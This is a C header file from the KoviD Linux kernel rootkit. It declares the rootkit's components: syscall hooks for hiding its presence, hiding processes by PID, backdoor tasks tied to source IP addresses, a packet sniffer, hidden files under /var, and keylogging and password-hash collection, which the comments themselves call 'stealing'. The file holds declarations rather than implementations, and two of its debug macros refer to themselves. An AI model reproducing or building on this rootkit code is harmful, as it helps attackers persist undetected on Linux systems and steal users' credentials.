/**
 * Linux Kernel version <= 5.5.0
 * - hash
 *
 *  KoviD rootkit
 */

#ifndef __KERNEL_ADDR_H
#define __KERNEL_ADDR_H

#ifdef DEBUG_RING_BUFFER
#pragma message "!!! Be careful: Build kovid in DEBUG mode !!!"
#define prinfo(fmt, ...) pr_info(fmt, ##__VA_ARGS__);
#define prwarn(fmt, ...) pr_warn(fmt, ##__VA_ARGS__);
#define prerr(fmt, ...)  pr_err(fmt, ##__VA_ARGS__);
#define premerg(fmt, ...)  pr_emerg(fmt, ##__VA_ARGS__);
#define pralert(fmt, ...)  pr_alert(fmt, ##__VA_ARGS__);
#define prcrit(fmt, ...)  prcrit(fmt, ##__VA_ARGS__);
#define prnotice(fmt, ...)  prnotice(fmt, ##__VA_ARGS__);
#define prinfo_ratelimited(fmt, ...) pr_info_ratelimited(fmt, ##__VA_ARGS__);
#define prwarn_ratelimited(fmt, ...) pr_warn_ratelimited(fmt, ##__VA_ARGS__);
#define prerr_ratelimited(fmt, ...) pr_err_ratelimited(fmt, ##__VA_ARGS__);
#define prinfo_once(fmt, ...) pr_info_once(fmt, ##__VA_ARGS__);
#define prwarn_once(fmt, ...) pr_warn_once(fmt, ##__VA_ARGS__);
#define prerr_once(fmt, ...) pr_err_once(fmt, ##__VA_ARGS__);

#else
#define prinfo(fmt, ...)
#define prwarn(fmt, ...)
#define premerg(fmt, ...)
#define pralert(fmt, ...)
#define prcrit(fmt, ...)
#define prnotice(fmt, ...)
#define prerr(fmt, ...)
#define prwarn_ratelimited(fmt, ...);
#define prinfo_ratelimited(fmt, ...);
#define prerr_ratelimited(fmt, ...);
#define prinfo_once(fmt, ...);
#define prwarn_once(fmt, ...);
#define prerr_once(fmt, ...);
#endif

#define TTYFILE "/var/.o4udk"
#define MD5FILE "/var/.ljd3p"
#define EXIT_UNHIDE 1
#define MD5LEN 32
#define MD5PAIRLEN (MD5LEN*2)
#define OBFLEN(x) (sizeof(x)/sizeof(char*))
#define OBFLEN2(x) sizeof(x)

typedef enum {
    CHILDREN,
    NO_CHILDREN,
    WHATEVER
}Operation;

struct hidden_tasks {
    struct task_struct *task;

    /** FS associated with task
     * NULL if kernel thread
     */
    struct fs_file_node *fnode;

    /**
     * backdoor tasks cannot
     * be left hanging around
     */
    int select;

    struct list_head list;
    pid_t group;

    /**
     * It is backdoor task
     * if source address != 0
     */
    __be32 saddr;
};

struct hidden_status {
    __be32 saddr;
    bool hidden;
};

#if LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0)
typedef void (*attach_pid_sg)(struct task_struct *, enum pid_type, struct pid *);
#else
typedef void (*attach_pid_sg)(struct task_struct *, enum pid_type);
#endif

typedef unsigned long (*kallsyms_lookup_name_sg)(const char *name);

typedef asmlinkage long (*sys64)(struct pt_regs *regs);

struct kernel_syscalls {
    attach_pid_sg k_attach_pid;
    kallsyms_lookup_name_sg k_kallsyms_lookup_name;
    sys64 k_sys_setreuid;
};

/** hooks, hiding presence and so */
bool sys_init(void);
void sys_deinit(void);

/** pid,task management */
bool kv_pid_init(void);
bool kv_find_hidden_pid(struct hidden_status *status, pid_t pid);
bool kv_find_hidden_task(struct task_struct *);
void kv_hide_task_by_pid(pid_t, __be32, Operation);
void kv_unhide_task_by_pid_exit_group(pid_t pid);
bool kv_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct*, void *), void *);
bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *);
void kv_reload_hidden_task(struct task_struct *task);
void kv_pid_cleanup(void);
void kv_show_saved_tasks(void);
void kv_scan_and_hide_netapp(void);

/** syscall,function addresses */
struct kernel_syscalls *kv_kall_load_addr(void);

/** socket,networking,backdoor management */
struct task_struct *kv_sock_start_sniff(const char *name);
void kv_sock_stop_sniff(struct task_struct *tsk);
bool kv_bd_search_iph(__be32 addr);
bool kv_check_cursing(struct tcphdr *);

/** proc handling */
int kv_add_proc_interface(void);
void kv_remove_proc_interface(void);
int kv_is_proc_interface_loaded(void);

/** data/passwords gathering/stealing */
void kv_keylog_rm_log(bool);
void kv_md5log_rm_log(bool);
bool kv_md5_add_hashes(char *, char *, bool);
void kv_md5_show_hashes(void);

/** whatever */
bool kv_whatever_is_md5(char *md5, ssize_t len);
char *kv_whatever_random_bytes(size_t);

char *kv_whatever_copystr(const char *in, unsigned long len);
char *kv_whatever_getstr(const char *in, unsigned int len);

char *kv_get_hidden_string(void);

/** VM operations */
unsigned long kv_get_elf_vm_start(pid_t);

// PP_NARG from
// https://groups.google.com/forum/#!topic/comp.std.c/d-6Mj5Lko_s
#define PP_NARG(...) \
    PP_NARG_(__VA_ARGS__,PP_RSEQ_N())
#define PP_NARG_(...) \
    PP_ARG_N(__VA_ARGS__)
#define PP_ARG_N( \
          _1, _2, _3, _4, _5, _6, _7, _8, _9,_10, \
         _11,_12,_13,_14,_15,_16,_17,_18,_19,_20, \
         _21,_22,_23,_24,_25,_26,_27,_28,_29,_30, \
         _31,_32,_33,_34,_35,_36,_37,_38,_39,_40, \
         _41,_42,_43,_44,_45,_46,_47,_48,_49,_50, \
         _51,_52,_53,_54,_55,_56,_57,_58,_59,_60, \
         _61,_62,_63,N,...) N
#define PP_RSEQ_N() \
         63,62,61,60,                   \
         59,58,57,56,55,54,53,52,51,50, \
         49,48,47,46,45,44,43,42,41,40, \
         39,38,37,36,35,34,33,32,31,30, \
         29,28,27,26,25,24,23,22,21,20, \
         19,18,17,16,15,14,13,12,11,10, \
         9,8,7,6,5,4,3,2,1,0

static inline void _kfree(void *p) {
    if (p != NULL) {
        kfree(p);
        p = NULL;
    }
}

static void __attribute__((unused))mem_free(int argc, ...) {
    va_list ap;
    int i;
    va_start(ap, argc);
    for (i = 0; i < argc; ++i)
        _kfree(va_arg(ap, void*));
    va_end(ap);
}
#define kv_mem_free(...) mem_free(PP_NARG(__VA_ARGS__), __VA_ARGS__)

#endif
